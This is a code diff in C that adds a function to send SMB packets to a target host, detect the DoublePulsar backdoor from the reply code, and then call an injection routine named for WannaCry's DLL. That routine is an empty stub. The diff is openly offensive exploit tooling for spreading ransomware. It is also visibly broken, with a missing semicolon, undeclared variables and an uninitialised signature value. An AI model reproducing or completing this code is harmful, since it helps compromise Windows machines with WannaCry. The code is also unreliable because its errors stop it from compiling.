@@ -57,8 +57,8 @@ int IsDOUBLEPULSAR_Present(char *host, int flagUninstall, u_short hostshort)
 	//send SMB negociate packet
 	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
 	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
 	//send Session Setup AndX request
-	printf("sending Session_Setup_AndX_Request!\n");
 	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
 	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
 	
@@ -109,6 +109,66 @@ int IsDOUBLEPULSAR_Present(char *host, int flagUninstall, u_short hostshort)
 		}
 		closesocket(dsock);
 	}
+	return 0;
+}
+
+int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int xkey)
+{
+
+}
+
+int runPayloadOnTarget(char *host, u_short hostshort)
+{
+	unsigned int signature_long;
+	unsigned int XorKey;
+	SOCKET dsock;
+	struct sockaddr name;
+	char userid[2];
+   	char treeid[2];
+	char recvbuff[1024];
+
+	name.sin_family = AF_INET;
+    	name.sin_addr.s_addr = inet_addr(host);
+    	name.sin_port = htons(hostshort);
+	dsock = socket(AF_INET, SOCK_STREAM, 0);
+	connect(dsock, (struct sockaddr*) &name, sizeof(name));
+	
+	//send SMB negociate packet
+	send(dsock, (char*)SmbNegociate, sizeof(SmbNegociate) - 1, 0);
+	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
+	//send Session Setup AndX request
+	send(dsock, (char*)Session_Setup_AndX_Request, sizeof(Session_Setup_AndX_Request) - 1, 0);
+	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
+	//copy userID from recvbuff @ 32,33
+	userid[0] = recvbuff[32];
+	userid[1] = recvbuff[33];
+	
+	//update userID in the tree connect request
+    	treeConnectRequest[32] = userid[0];
+    	treeConnectRequest[33] = userid[1];
+	send(dsock, (char*)treeConnectRequest, sizeof(treeConnectRequest) - 1, 0);
+	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
+	//copy treeID from recvbuff @ 28, 29
+    	treeid[0] = recvbuff[28];
+   	treeid[1] = recvbuff[29];
+	
+	trans2_session_setup[28] = treeid[0];
+        trans2_session_setup[29] = treeid[1]
+        trans2_session_setup[32] = userid[0];
+        trans2_session_setup[33] = userid[1];
+
+	send(dsock, (char*)trans2_session_setup, sizeof(trans2_session_setup) - 1, 0);
+	recv(dsock, (char*)recvbuff, sizeof(recvbuff), 0);
+	
+	if (recvbuff[34] == 0x51)
+	{
+		XorKey = ComputeDOUBLEPULSARXorKey(signature_long);
+		InjectWannaCryDLLViaDoublePulsarBackdoor(Socket, ArchitectureType, XorKey);
+	}
+	closesocket(dsock);
 	return 0;
 }
 
